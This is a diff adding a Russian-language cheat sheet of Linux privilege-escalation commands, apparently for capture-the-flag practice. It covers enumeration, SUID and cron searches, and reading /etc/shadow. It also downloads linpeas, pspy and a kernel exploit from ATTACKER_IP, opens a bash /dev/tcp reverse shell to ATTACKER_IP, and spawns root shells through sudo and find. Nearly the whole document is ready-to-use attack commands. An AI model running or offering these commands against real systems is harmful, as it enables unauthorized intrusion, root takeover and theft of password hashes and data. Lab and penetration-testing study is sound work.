@@ -1,0 +1,209 @@
+Ниже единый список команд для privilege escalation / enumeration. После каждой — очень короткое объяснение.
+________________________________________
+sudo -l
+=Проверка команд, которые можно запускать через sudo.
+
+id
+=Показывает UID, группы пользователя.
+
+whoami
+=Текущий пользователь.
+
+uname -a
+=Полная информация о ядре Linux.
+
+uname -r
+=Версия ядра (нужно для kernel exploit).
+
+cat /etc/issue
+=Версия системы.
+
+cat /etc/os-release
+=Подробная информация о дистрибутиве.
+
+env
+=Переменные окружения (иногда есть токены или пути).
+
+ps aux
+=Все запущенные процессы.
+
+ps -ef
+=Альтернативный список процессов.
+
+history
+=История команд пользователя.
+
+cat ~/.bash_history
+=История команд в bash.
+________________________________________
+Поиск SUID / SGID
+
+find / -perm -4000 -type f 2>/dev/null
+=Файлы с SUID (часто используются для privesc).
+
+find / -perm -2000 -type f 2>/dev/null
+=Файлы с SGID.
+
+find / -perm -u=s -type f 2>/dev/null
+=Другой способ поиска SUID.
+________________________________________
+Поиск writable файлов
+
+find / -writable -type d 2>/dev/null
+=Каталоги доступные для записи.
+
+find / -writable -type f 2>/dev/null
+=Файлы доступные для записи.
+________________________________________
+Проверка важных директорий
+
+ls -la /root
+=Проверка доступа к root директории.
+
+ls -la /home
+=Пользовательские директории.
+
+ls -la /tmp
+=Временная папка (обычно writable).
+
+ls -la /var/tmp
+=Временная папка.
+
+ls -la /dev/shm
+=Shared memory (часто используется для эксплойтов).
+________________________________________
+Проверка cron
+crontab -l
+
+=Cron задачи текущего пользователя.
+cat /etc/crontab
+
+=Системные cron задачи.
+ls -la /etc/cron*
+=Все cron директории.
+
+cat /etc/cron.daily/*
+=Ежедневные задания.
+
+cat /etc/cron.hourly/*
+=Почасовые задания.
+
+cat /etc/cron.weekly/*
+=Еженедельные задания.
+
+cat /etc/cron.monthly/*
+=Ежемесячные задания.
+________________________________________
+Пользователи
+
+cat /etc/passwd
+=Список пользователей.
+
+cat /etc/shadow
+=Хэши паролей (если доступно).
+________________________________________
+Linux capabilities
+
+getcap -r / 2>/dev/null
+=Поиск файлов с capabilities (иногда даёт root).
+
+________________________________________
+linpeas
+
+wget http://ATTACKER_IP:8000/linpeas.sh
+=Скачать linpeas.
+
+chmod +x linpeas.sh
+=Дать права на запуск.
+
+./linpeas.sh
+=Запустить сканирование privesc.
+________________________________________
+pspy (поиск cron / процессов)
+
+wget http://ATTACKER_IP:8000/pspy64
+=Скачать pspy.
+
+chmod +x pspy64
+=Дать права.
+
+./pspy64
+=Мониторинг процессов.
+________________________________________
+Kernel exploit поиск
+
+searchsploit 3.13
+=Поиск эксплойтов для ядра.
+
+searchsploit overlayfs
+=Поиск OverlayFS exploit.
+
+searchsploit -m 37292
+=Скачать exploit.
+________________________________________
+Компиляция exploit
+
+cd /tmp
+
+=Перейти во временную папку.
+wget http://ATTACKER_IP:8000/37292.c
+
+=Скачать exploit.
+gcc 37292.c -o exploit
+
+=Скомпилировать exploit.
+chmod +x exploit
+
+=Дать права.
+./exploit
+
+=Запустить exploit.
+________________________________________
+Reverse shell
+
+nc -lvnp 4444
+
+=Слушать соединение.
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+=Отправить reverse shell.
+________________________________________
+Улучшение shell
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+=Получить полноценный bash.
+
+export TERM=xterm
+=Исправить терминал.
+
+Ctrl+Z
+=Приостановить shell.
+
+stty raw -echo
+=Исправить ввод.
+
+fg
+=Вернуть shell.
+
+reset
+=Перезапуск терминала.
+________________________________________
+sudo shell
+
+sudo -u root /bin/bash
+=Запуск bash от root.
+
+sudo -u root /bin/sh
+=Shell от root.
+
+sudo /bin/bash
+=Root bash.
+________________________________________
+Чтение флага
+
+cat /root/root.txt
+=Получить root флаг.
+
+
+sudo find . -exec /bin/bash \; -quit
+=получение через root через find
